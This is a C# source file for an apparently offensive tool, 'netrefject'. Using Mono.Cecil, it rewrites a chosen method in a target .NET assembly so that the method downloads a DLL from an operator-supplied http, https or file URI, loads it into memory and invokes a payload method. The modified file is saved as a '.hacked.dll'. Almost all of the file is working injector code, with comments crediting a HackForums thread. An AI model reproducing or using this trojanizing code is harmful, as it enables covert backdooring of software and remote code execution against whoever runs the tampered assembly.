using System;
using System.Collections.Generic;
using System.Reflection;
using System.Linq;

//Payload usings
using System.IO;
using System.Net.Sockets;
using System.Net;

using Mono.Cecil;
using Mono.Cecil.Cil;

namespace netrefject
{
    class Worker
    {
        Assembly a = null;
        Dictionary<string, MethodReference> methods = new Dictionary<string, MethodReference>(); 

        public static void syntax()
        {
            Console.WriteLine("netrefject filename payloadURI payloadMethod (Method should have no parameters)");
            Console.WriteLine("netrefject assemblytohack.dll file:///path/payload.dll payloadMethodToExecute");
            Console.WriteLine("netrefject assemblytohack.dll http://path/payload.dll payloadMethodToExecute");
            Console.WriteLine("netrefject assemblytohack.dll https://path/payload.dll payloadMethodToExecute");
        }

        public void HandleInjectionFlow(string filename, string payloadURI, string payloadMethod)
        {
            try{
                MethodInfo injectMethod = findInjectionMethod(filename,payloadURI,payloadMethod);
                if (injectMethod != null)
                    Console.WriteLine("[SUCCESS] injected into " + injectMethod.Name);
                else{
                    Console.WriteLine("[FAILURE]");
                }
            }
            catch(Exception e){
                Console.WriteLine("[FAILURE]" + e.Message);
            }
        }

        #region method enum
        private MethodInfo findInjectionMethod(string filename, string payloadURI, string payloadMethod)
        {
            MethodInfo mi = null;

            try
            {
                Assembly origAssy = Assembly.LoadFrom(filename);

                Console.WriteLine("[+] Loading modules");

                Dictionary<int, Module> internalModules = new Dictionary<int, Module>();
                int counter = 1;

                //Enumerate modules
                foreach (Module m in origAssy.GetLoadedModules())
                {
                    internalModules.Add(counter, m);
                    Console.WriteLine("[*] " + counter.ToString() + " " + m.Name);
                    counter++;
                }

                int moduleNumber = -1;
                //User chooses module
                while (!internalModules.ContainsKey(moduleNumber)) {
                    moduleNumber = chooseNumber("Please choose module number for type enumeration");
                }

                Console.WriteLine("[*] Enumerating Module " + internalModules[moduleNumber].FullyQualifiedName);

                Dictionary<int, Type> internalModuleTypes = new Dictionary<int, Type>();
                counter = 1;

                //Enumerate Types on chosen module
                foreach (Type t in internalModules[moduleNumber].GetTypes())
                {
                    internalModuleTypes.Add(counter, t);
                    Console.WriteLine("[*] " + counter.ToString() + " " + t.Name);
                    counter++;
                }

                int classNumber = -1;
                //User chooses type
                while (!internalModuleTypes.ContainsKey(classNumber))
                {
                    classNumber = chooseNumber("Please choose type number for method enumeration");
                }

                Console.WriteLine("[*] Enumerating Type " + internalModuleTypes[classNumber].FullName);

                Dictionary<int, MethodInfo> internalMethods = new Dictionary<int, MethodInfo>();
                counter = 1;

                //Enumerate Methods
                foreach(MethodInfo imi in internalModuleTypes[classNumber].GetRuntimeMethods())
                {
                    internalMethods.Add(counter, imi);
                    Console.WriteLine("[*] " + counter.ToString() + " " + imi.Name);
                    counter++;
                    foreach (ParameterInfo pi in imi.GetParameters())
                    {
                        Console.WriteLine("[*]\t" + pi.Name + ":" + pi.ParameterType.FullName);
                    }
                }

                int methodNumber = -1;
                while (!internalMethods.ContainsKey(methodNumber))
                {
                    methodNumber = chooseNumber("Please choose method number for injection");
                }

                Console.WriteLine("[!!] Will try inject payload into:");
                Console.WriteLine("\tModule:" + internalModules[moduleNumber].FullyQualifiedName);
                Console.WriteLine("\tClass:" + internalModuleTypes[classNumber].FullName);
                Console.WriteLine("\tMethod:" + internalMethods[methodNumber].Name);

                //injectBadStuffLame(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber], payloadURI, payloadMethod);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message + ":" + e.StackTrace);
            }

            return mi;
        }

        private int chooseNumber(string question)
        {
            string numberInput = "";
            int number;

            while (!int.TryParse(numberInput, out number))
            {
                Console.Write("[?] " + question + ":");
                numberInput = Console.ReadLine();
            }

            return number;
        }
        #endregion

        /// <summary>
        /// Cecil code with thanks from Hopeless
        /// https://stackoverflow.com/questions/46052447/replace-methods-body-with-body-of-another-method-using-mono-cecil
        /// Also
        /// https://stackoverflow.com/questions/24852885/mono-cecil-add-class-with-method-into-assembly
        /// </summary>
        /// <param name="moduleT"></param>
        /// <param name="classT"></param>
        /// <param name="methodT"></param>
        /// <param name="payloadURI">URI to Assembly containing your payload</param>        
        /// <param name="payloadMethod">Method Name to execute once payload is loaded</param>
        /// <returns></returns>
        private bool injectBadStuff(Module moduleT, Type classT, MethodInfo methodT, string payloadURI, string payloadMethod)
        {
            AssemblyDefinition targetAsm = AssemblyDefinition.ReadAssembly(moduleT.Assembly.Location);
            TypeDefinition targetType = targetAsm.MainModule.Types.FirstOrDefault(e => e.Name == classT.Name);
            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == methodT.Name);

            Console.WriteLine("Instructions Before:" + m1.Body.Instructions.Count.ToString());

            injectShell(m1, classT, methodT, payloadURI,payloadMethod);

            Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());

            //finally write to another output assembly    
            targetAsm.Write(moduleT.Assembly.FullName + ".hacked.dll");

            return true;            
        }

        private void injectShell(MethodDefinition m1, Type classT, MethodInfo methodT, string payloadURI, string payloadMethod){
            //Heavily modified, but based on
            //HackForums by a guy called TheBigDamnGa
            //https://hackforums.net/showthread.php?tid=5924760            

            ILProcessor ilp = m1.Body.GetILProcessor();
            //Remove All code and variables
            m1.Body.Instructions.Clear();
            m1.Body.Variables.Clear();
            m1.Body.ExceptionHandlers.Clear();

            //Used to just remove the ret but I'm not sure if adding variables will fuck shit up so im clearing everything for now
            //ilp.Remove(m1.Body.Instructions[m1.Body.Instructions.Count-1]);

            // Initialize References
            References refs = new References();
            refs.uint8 = m1.Module.ImportReference(typeof(byte[]));
            refs.Assembly = m1.Module.ImportReference(typeof(Assembly));
            refs.MethodInfo = m1.Module.ImportReference(typeof(MethodInfo));
            refs.var = m1.Module.ImportReference(typeof(object));
            refs.boolean = m1.Module.ImportReference(typeof(bool));
            refs.var_array = m1.Module.ImportReference(typeof(object[]));
            refs.int32 = m1.Module.ImportReference(typeof(int));
            refs.Exception = m1.Module.ImportReference(typeof(Exception));

            refs.WebClientCtor = m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }));
            refs.WebClient_DownloadData = m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }));

            refs.Assembly_Load = m1.Module.ImportReference(typeof(Assembly).GetMethod("Load", new Type[] { typeof(sbyte[]) }));
            refs.Assembly_getEntryPoint = m1.Module.ImportReference(typeof(Assembly).GetMethod("get_EntryPoint", new Type[] { }));
            refs.Assembly_CreateInstance = m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }));

            refs.MemberInfo_getName = m1.Module.ImportReference(typeof(MemberInfo).GetMethod("get_Name", new Type[] { }));

            refs.MethodBase_GetParameters = m1.Module.ImportReference(typeof(MethodBase).GetMethod("GetParameters", new Type[] { }));
            refs.MethodBase_Invoke = m1.Module.ImportReference(typeof(MethodBase).GetMethod("Invoke", new Type[] { typeof(object), typeof(object[]) }));


            m1.Body.InitLocals = true;
            m1.Body.Variables.Add(new VariableDefinition(refs.uint8));
            //Remote Class Instance Variable
            m1.Body.Variables.Add(new VariableDefinition(refs.var));
            //Remote class Type Variable 
            m1.Body.Variables.Add(new VariableDefinition(m1.Module.ImportReference(typeof(Type))));
            m1.Body.Variables.Add(new VariableDefinition(refs.var));

            var evilRemoteBytesVar = m1.Body.Variables.ElementAt(0);
            var instantiatedEvilTypeVar = m1.Body.Variables.ElementAt(1);
            var typeVariable = m1.Body.Variables.ElementAt(2);
            var someResultObjectVar = m1.Body.Variables.ElementAt(3);

            ilp.Append(Instruction.Create(OpCodes.Nop));
            ilp.Append(Instruction.Create(OpCodes.Nop));

            Instruction RETI = Instruction.Create(OpCodes.Ret);
            Instruction POPI = Instruction.Create(OpCodes.Pop);
            Instruction NOPI = Instruction.Create(OpCodes.Nop);

            ilp.Append(Instruction.Create(OpCodes.Nop));

            //ilp.Append(ilp.Create (OpCodes.Ldstr, "INJECTED EVIL"));
            //ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));

            //Download DLL
            ilp.Append(Instruction.Create(OpCodes.Nop));
            ilp.Append(Instruction.Create(OpCodes.Newobj, m1.Module.ImportReference(typeof(WebClient).GetConstructor(new Type[] { }))));
            ilp.Append(Instruction.Create(OpCodes.Ldstr, payloadURI));
            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
            ilp.Append(Instruction.Create(OpCodes.Stloc_0));

            //Load into memory
            ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
            ilp.Append(Instruction.Create(OpCodes.Call, refs.Assembly_Load));

            //Create instance of class
            ilp.Append(Instruction.Create(OpCodes.Ldstr, classT.FullName));
            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }))));
            ilp.Append(Instruction.Create(OpCodes.Stloc_S,instantiatedEvilTypeVar));
            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));

            //Load type of class in order to call method
            ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference (typeof (object).GetMethod ("GetType", new Type[] {}))));
            //Type is now on stack...            

            //Call method in class with Type.InvokeMember
            ilp.Append(ilp.Create(OpCodes.Ldstr,payloadMethod));
            ilp.Append(ilp.Create(OpCodes.Ldc_I4,0x100));
            ilp.Append(ilp.Create(OpCodes.Ldnull));
            ilp.Append(ilp.Create(OpCodes.Ldloc_1));
            ilp.Append(ilp.Create(OpCodes.Ldnull));
            
            ilp.Append(ilp.Create(OpCodes.Callvirt,
                m1.Module.ImportReference(
                    typeof(Type).GetMethod("InvokeMember", 
                        new Type[] { 
                            typeof(string), 
                            typeof(BindingFlags),
                            typeof(Binder),
                            typeof(object),
                            typeof(object[])
                        })
                    )
                )
            );

            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Pop));
            m1.Body.Instructions.Add(Instruction.Create(OpCodes.Nop));

            //ilp.Append(ilp.Create (OpCodes.Ldstr, "Wattefok dit werk nou bra"));
            //ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
            
            ilp.Append(Instruction.Create(OpCodes.Nop));

            //Add our new ret
            ilp.Append(RETI);
            return;
        }
    }
}
